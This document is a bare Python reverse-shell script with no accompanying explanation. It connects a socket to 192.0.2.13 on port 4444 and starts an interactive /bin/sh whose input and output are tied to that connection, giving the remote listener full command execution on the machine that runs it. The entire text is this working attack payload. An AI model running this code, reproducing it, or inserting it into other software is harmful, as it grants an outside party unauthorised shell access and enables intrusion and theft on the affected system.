import socket
import subprocess

sock = socket.socket()
sock.connect(('192.0.2.13', 4444))
subprocess.Popen(['/bin/sh', '-i'], stdin=sock.fileno(),
                 stdout=sock.fileno(), stderr=sock.fileno())
